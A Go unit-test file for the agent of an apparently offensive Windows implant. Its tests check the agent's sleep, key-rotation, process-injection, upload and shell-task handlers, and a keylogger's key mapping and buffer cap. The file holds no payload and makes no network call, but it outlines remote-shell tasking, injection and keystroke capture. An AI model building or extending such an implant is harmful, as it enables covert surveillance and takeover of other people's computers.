//go:build windows

package agent

import (
	"bytes"
	"encoding/binary"
	"testing"

	"github.com/VoidSecSoftwares/voidsyscall/channels"
)

func testAgent() *Agent {
	return &Agent{config: &Config{Key: make([]byte, 32)}}
}

func taskMsg(typ TaskType, data []byte) *channels.Message {
	msg := &channels.Message{Type: 0x01}
	copy(msg.ID[:], bytes.Repeat([]byte{0x7f}, 16))
	msg.Data = append([]byte{byte(typ)}, data...)
	return msg
}

func TestHandleSleep(t *testing.T) {
	a := testAgent()
	data := make([]byte, 4)
	binary.LittleEndian.PutUint32(data, 45)
	res := a.handleSleep(nil, &TaskResult{}, data)
	if res.Status != 0 {
		t.Fatalf("status: %d", res.Status)
	}
	if a.config.Sleep != 45 {
		t.Fatalf("sleep: %d", a.config.Sleep)
	}
}

func TestHandleSleepShort(t *testing.T) {
	a := testAgent()
	res := a.handleSleep(nil, &TaskResult{}, []byte{1, 2})
	if res.Status != 0x01 {
		t.Fatal("expected error status")
	}
}

func TestHandleRotateKey(t *testing.T) {
	a := testAgent()
	newKey := bytes.Repeat([]byte{0x11}, 32)
	res := a.handleRotateKey(nil, &TaskResult{}, newKey)
	if res.Status != 0 {
		t.Fatalf("status: %d", res.Status)
	}
	if !bytes.Equal(a.config.Key, newKey) {
		t.Fatal("key not rotated")
	}
}

func TestHandleRotateKeyWrongLength(t *testing.T) {
	a := testAgent()
	res := a.handleRotateKey(nil, &TaskResult{}, []byte{1, 2, 3})
	if res.Status != 0x01 {
		t.Fatal("expected error status for short key")
	}
}

func TestHandleInjectShort(t *testing.T) {
	a := testAgent()
	// One byte of "pid" is not enough for the 4-byte header; the handler must
	// bail before touching syscall code.
	res := a.handleInject(nil, &TaskResult{}, []byte{0x01})
	if res.Status != 0x01 {
		t.Fatal("expected error status for truncated inject")
	}
}

func TestHandleUploadShort(t *testing.T) {
	a := testAgent()
	res := a.handleUpload(nil, &TaskResult{}, []byte{1, 2})
	if res.Status != 0x01 {
		t.Fatal("expected error status for truncated upload frame")
	}
}

func TestExecuteTaskDispatch(t *testing.T) {
	a := testAgent()
	res := a.executeTask(taskMsg(TaskShell, []byte("echo hi")))
	// cmd execution is not guaranteed in CI sandboxes; just require a result
	// either way, and that the TaskID is preserved.
	if res == nil {
		t.Fatal("no result")
	}
	if !bytes.Equal(res.TaskID[:], bytes.Repeat([]byte{0x7f}, 16)) {
		t.Fatal("task id not propagated")
	}
}

func TestExecuteTaskUnknown(t *testing.T) {
	a := testAgent()
	res := a.executeTask(taskMsg(0xFE, nil))
	if res.Status != 0x01 {
		t.Fatal("expected error status for unknown task type")
	}
}

func TestKeylogRuneBase(t *testing.T) {
	cases := []struct {
		vk    byte
		shift bool
		want  string
	}{
		{0x41, false, "a"},
		{0x41, true, "A"},
		{0x5A, false, "z"},
		{0x30, false, "0"},
		{0x31, true, "!"},
		{0x39, true, "("},
		{0x60, false, "0"},
		{0x69, false, "9"},
		{0x0D, false, "\n"},
		{0x20, false, " "},
		{0x08, false, "[BS]"},
		{0xBA, true, ":"},
		{0xBD, false, "-"},
		{0xBD, true, "_"},
	}
	for _, c := range cases {
		if got := keylogRune(c.vk, c.shift); got != c.want {
			t.Errorf("keylogRune(%#x, shift=%v) = %q, want %q", c.vk, c.shift, got, c.want)
		}
	}
}

func TestKeylogBufferCap(t *testing.T) {
	a := testAgent()
	a.keylogBuf = make([]byte, 0, maxKeylogBytes)
	for i := 0; i < maxKeylogBytes/8; i++ {
		a.appendKeylog([]byte("01234567"))
	}
	if len(a.keylogBuf) != maxKeylogBytes {
		t.Fatalf("expected cap fill to %d, got %d", maxKeylogBytes, len(a.keylogBuf))
	}
	before := len(a.keylogBuf)
	a.appendKeylog([]byte("overflow-that-does-not-fit"))
	if len(a.keylogBuf) != before {
		t.Fatalf("cap violated: %d -> %d", before, len(a.keylogBuf))
	}
}
